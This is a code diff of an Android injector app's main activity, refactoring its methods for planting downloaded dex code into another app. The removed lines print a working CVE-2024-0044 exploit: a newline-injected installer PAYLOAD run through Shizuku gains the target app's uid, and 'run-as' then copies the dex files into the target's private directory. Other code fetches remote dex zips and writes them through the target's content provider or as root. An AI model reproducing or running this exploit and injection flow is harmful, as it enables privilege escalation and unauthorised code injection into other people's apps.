@@ -44,6 +44,10 @@ import com.wunelezi.injector.model.InjectionMethod
 import com.wunelezi.injector.model.LoadResult
 import com.wunelezi.injector.model.ModuleInfo
 import com.wunelezi.injector.util.PluginManager
+import com.wunelezi.injector.inject.CvePmHandler
+import com.wunelezi.injector.inject.CvePackageInstallerHandler
+import com.wunelezi.injector.inject.ShizukuExecutor
+import com.wunelezi.injector.inject.DexNotFoundException
 import rikka.shizuku.Shizuku
 import rikka.shizuku.Shizuku.OnRequestPermissionResultListener
 import kotlinx.coroutines.Dispatchers
@@ -703,7 +707,8 @@ class MainActivity : AppCompatActivity() {
         when (method) {
             InjectionMethod.START_ANYWHERE_NGWEBVIEW -> startStartAnyWhereInjection(packageName)
             InjectionMethod.START_ANYWHERE_ASSIST -> startStartAnyWhereAssistInjection(packageName)
-            InjectionMethod.CVE_2024_0044 -> startCve20240044Injection(packageName)
+            InjectionMethod.CVE_2024_0044_PM -> startCveInjection(packageName, CvePmHandler(this))
+            InjectionMethod.CVE_2024_0044_PACKAGEINSTALLER -> startCveInjection(packageName, CvePackageInstallerHandler(this))
             InjectionMethod.ROOT -> startRootInjection(packageName)
         }
     }
@@ -926,62 +931,24 @@ class MainActivity : AppCompatActivity() {
 
     // ==================== CVE-2024-0044 注入流程 ====================
 
-    /** Shizuku 执行命令的返回结果 */
-    private data class ShellResult(val exitCode: Int, val output: String)
-
-    /**
-     * 通过 Shizuku/Stellar 以系统/root 身份执行 shell 命令。
-     *
-     * 采用 newProcess：直接在 Shizuku/Stellar 服务端进程内 exec，不创建新的 Android 进程，
-     * 因此不会出现 UserService 方式在部分设备（Stellar UserServiceStarter）上的
-     * LoadedApk.makeApplication NPE 崩溃。newProcess 在 Rikka 13.x 为 private，故反射调用。
-     *
-     * @param command 要执行的命令（经 sh -c 执行）
-     * @param env     环境变量数组（形如 "KEY=VALUE"，可用于携带含换行的 PAYLOAD）
-     * @return 退出码与合并后的输出
-     */
-    private fun shizukuShell(command: String, env: Array<String>? = null): ShellResult {
-        if (!Shizuku.pingBinder()) {
-            throw IllegalStateException("Shizuku 未连接")
-        }
-        val process = shizukuNewProcessMethod.invoke(
-            null,
-            arrayOf("sh", "-c", command),
-            env,
-            null
-        ) as Process
-        val out = process.inputStream.bufferedReader().use { it.readText() }
-        val err = process.errorStream.bufferedReader().use { it.readText() }
-        val exitCode = process.waitFor()
-        return ShellResult(exitCode, out + err)
-    }
-
-    /**
-     * 确保已获得 Shizuku 权限（官方流程）：
-     *  1. isPreV11() 过低版本不支持；
-     *  2. pingBinder() 未连接则提示；
-     *  3. 已授权直接回调；
-     *  4. shouldShowRequestPermissionRationale() 用户曾拒绝且不再提示，引导手动授权；
-     *  5. 否则发起 requestPermission，结果经 OnRequestPermissionResultListener 回调。
-     */
     private fun ensureShizukuPermission(onGranted: () -> Unit) {
-        if (Shizuku.isPreV11()) {
+        if (ShizukuExecutor.isPreV11()) {
             runOnUiThread {
                 showErrorDialog("Shizuku 版本过低", Exception("Shizuku 版本过低，请升级 Shizuku 后重试。"))
             }
             return
         }
-        if (!Shizuku.pingBinder()) {
+        if (!ShizukuExecutor.isConnected()) {
             runOnUiThread {
                 showErrorDialog("Shizuku 未连接", Exception("Shizuku 服务未运行，请先启动 Shizuku（adb / 已 root 的 Shizuku）后再试。"))
             }
             return
         }
-        if (Shizuku.checkSelfPermission() == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+        if (ShizukuExecutor.hasPermission()) {
             onGranted()
             return
         }
-        if (Shizuku.shouldShowRequestPermissionRationale()) {
+        if (ShizukuExecutor.shouldShowRationale()) {
             runOnUiThread {
                 showErrorDialog(
                     "Shizuku 权限被拒绝",
@@ -998,125 +965,37 @@ class MainActivity : AppCompatActivity() {
         Shizuku.requestPermission(SHIZUKU_PERMISSION_REQUEST_CODE)
     }
 
-    /**
-     * CVE-2024-0044 入口：先请求 Shizuku 权限，授予成功后执行完整流程。
-     */
-    private fun startCve20240044Injection(targetPackage: String) {
+    private fun startCveInjection(targetPackage: String, handler: com.wunelezi.injector.inject.InjectionHandler) {
         ensureShizukuPermission {
-            runCveFlow(targetPackage)
-        }
-    }
-
-    /**
-     * CVE-2024-0044 完整流程：
-     *  1. 下载 dex zip（404 -> 提示 dialog）
-     *  2. 解压，遍历 dex 文件通过 writeUri 写入目标 app 的 widget_file_provider/widget_file_cache
-     *  3. 从 assets 解压 cve-2024-0044.apk 到本 app 私有目录
-     *  4. 通过 Shizuku 执行 mv 把 apk 移动到 /data/local/tmp
-     *  5. 获取目标应用 uid
-     *  6. 通过 Shizuku 以 PAYLOAD 环境变量（保留换行符）执行 pm install -i "$PAYLOAD"
-     *  7. 安装成功则通过 Shizuku 执行 run-as mcinject cp 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
-     *  8. toast 注入 dex 成功
-     * 任一步骤异常或命令非零退出均弹 dialog 报告。
-     */
-    private fun runCveFlow(targetPackage: String) {
-        showLoadingDialog()
-        Thread {
-            try {
-                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
-                val versionSegment = customVersion ?: run {
-                    val pi = packageManager.getPackageInfo(targetPackage, 0)
-                    val vName = pi.versionName ?: "unknown"
-                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
-                        pi.longVersionCode.toString()
-                    } else {
-                        @Suppress("DEPRECATION")
-                        pi.versionCode.toString()
+            showLoadingDialog()
+            Thread {
+                try {
+                    val versionSegment = customVersion ?: run {
+                        val pi = packageManager.getPackageInfo(targetPackage, 0)
+                        val vName = pi.versionName ?: "unknown"
+                        val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
+                            pi.longVersionCode.toString()
+                        } else {
+                            @Suppress("DEPRECATION")
+                            pi.versionCode.toString()
+                        }
+                        "${vName}_$vCode"
                     }
-                    "${vName}_$vCode"
-                }
-
-                // 1. 下载 dex zip
-                val zipFile = java.io.File(cacheDir, "wnlz_cve_$versionSegment.zip")
-                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
-                if (code == 404) {
+                    handler.execute(targetPackage, versionSegment)
+                    runOnUiThread {
+                        hideLoadingDialog()
+                        Toast.makeText(this@MainActivity, "注入dex成功", Toast.LENGTH_LONG).show()
+                    }
+                } catch (e: DexNotFoundException) {
                     runOnUiThread { showNotFoundDialog() }
-                    return@Thread
-                }
-                if (code != 200) {
-                    throw java.io.IOException("下载 dex 失败 HTTP $code")
-                }
-
-                // 2. 解压并遍历 dex，通过 writeUri 写入 widget_file_provider/widget_file_cache
-                val extractDir = java.io.File(cacheDir, "wnlz_cve_$versionSegment")
-                extractDir.deleteRecursively()
-                extractDir.mkdirs()
-                val dexFiles = unzipZip(zipFile, extractDir)
-
-                for (dex in dexFiles) {
-                    val targetUri = "content://com.netease.x19.widget_file_provider/widget_file_cache/${dex.name}"
-                    val os = contentResolver.openOutputStream(Uri.parse(targetUri))
-                        ?: throw java.io.IOException("无法打开输出流: $targetUri")
-                    os.use { out ->
-                        dex.inputStream().use { it.copyTo(out) }
+                } catch (e: Exception) {
+                    runOnUiThread {
+                        hideLoadingDialog()
+                        showInjectErrorDialog(e)
                     }
                 }
-
-                // 3. 从 assets 解压 cve-2024-0044.apk 到外部存储的 Android/data 目录
-                //    （/storage/emulated/0/Android/data/<包名>/）。该目录 shell 身份可读，
-                //    避免原先放在内部私有目录时 Shizuku(mv) 因无权限读取源文件而 Permission denied。
-                val extDir = getExternalFilesDir(null)
-                    ?: throw java.io.IOException("外部存储不可用，无法导出 cve-2024-0044.apk")
-                val apkFile = java.io.File(extDir, "cve-2024-0044.apk")
-                assets.open("cve-2024-0044.apk").use { input ->
-                    apkFile.outputStream().use { input.copyTo(it) }
-                }
-
-                // 4. Shizuku 复制 apk 到 /data/local/tmp（使用 cp 而非 mv：
-                //    外部 Android/data 目录下的源文件 app 自身可删，无需 shell 去 unlink，
-                //    因此复制成功后由 app 侧删除源文件，规避 shell 删除外部目录的权限问题）
-                var r = shizukuShell("cp ${apkFile.absolutePath} /data/local/tmp/cve-2024-0044.apk")
-                if (r.exitCode != 0) {
-                    throw RuntimeException("复制 cve-2024-0044.apk 失败 (exit ${r.exitCode}):\n${r.output}")
-                }
-                // 源文件已复制，app 侧删除外部目录里的副本
-                runCatching { apkFile.delete() }
-
-                // 5. 获取目标应用 uid
-                val uid = packageManager.getApplicationInfo(targetPackage, 0).uid
-
-                // 6. PAYLOAD 环境变量（保留原始换行符） + pm install -i "$PAYLOAD"
-                val payload = """
-                    @null
-                    mcinject $uid 1 /data/user/0
-                    default:targetSdkVersion=28 none 0 0 1 @null
-                """.trimIndent()
-                r = shizukuShell(
-                    "pm install -i \"\$PAYLOAD\" /data/local/tmp/cve-2024-0044.apk",
-                    arrayOf("PAYLOAD=$payload")
-                )
-                if (r.exitCode != 0) {
-                    throw RuntimeException("pm install 失败 (exit ${r.exitCode}):\n${r.output}")
-                }
-
-                // 7. 安装成功：run-as mcinject 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
-                r = shizukuShell("run-as mcinject cp -f cache/classes*.dex \"app_ntp0/$versionSegment/.unzip/\"")
-                if (r.exitCode != 0) {
-                    throw RuntimeException("复制 dex 失败 (exit ${r.exitCode}):\n${r.output}")
-                }
-
-                // 8. 成功
-                runOnUiThread {
-                    hideLoadingDialog()
-                    Toast.makeText(this@MainActivity, "注入dex成功", Toast.LENGTH_LONG).show()
-                }
-            } catch (e: Exception) {
-                runOnUiThread {
-                    hideLoadingDialog()
-                    showInjectErrorDialog(e)
-                }
-            }
-        }.start()
+            }.start()
+        }
     }
 
     // ==================== Root 注入流程 ====================
@@ -1144,7 +1023,7 @@ class MainActivity : AppCompatActivity() {
 
                 // 1. 下载 dex zip（与 CVE 方式同源）
                 val zipFile = java.io.File(cacheDir, "wnlz_root_$versionSegment.zip")
-                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
+                val code = downloadZip("https://github.com/caofangkuai/WNLZ-Injector-dex/releases/download/$versionSegment/dex.zip", zipFile)
                 if (code == 404) {
                     runOnUiThread { showNotFoundDialog() }
                     return@Thread
@@ -1224,18 +1103,12 @@ class MainActivity : AppCompatActivity() {
         }.start()
     }
 
-    /**
-     * 以 Root 身份执行单条 shell 命令（su -c）。
-     *
-     * @param command 要执行的命令（直接交给 su -c，内部如需多行请用脚本文件）
-     * @return 退出码与合并后的输出
-     */
-    private fun rootShell(command: String): ShellResult {
+    private fun rootShell(command: String): com.wunelezi.injector.inject.ShellResult {
         val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
         val out = process.inputStream.bufferedReader().use { it.readText() }
         val err = process.errorStream.bufferedReader().use { it.readText() }
         val exitCode = process.waitFor()
-        return ShellResult(exitCode, out + err)
+        return com.wunelezi.injector.inject.ShellResult(exitCode, out + err)
     }
 
     /**
@@ -1337,7 +1210,7 @@ class MainActivity : AppCompatActivity() {
             try {
                 // 1. 下载 zip
                 val zipFile = java.io.File(cacheDir, "wnlz_inject_$versionSegment.zip")
-                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
+                val code = downloadZip("https://github.com/caofangkuai/WNLZ-Injector-dex/releases/download/$versionSegment/dex.zip", zipFile)
                 if (code == 404) {
                     runOnUiThread { showNotFoundDialog() }
                     return@Thread
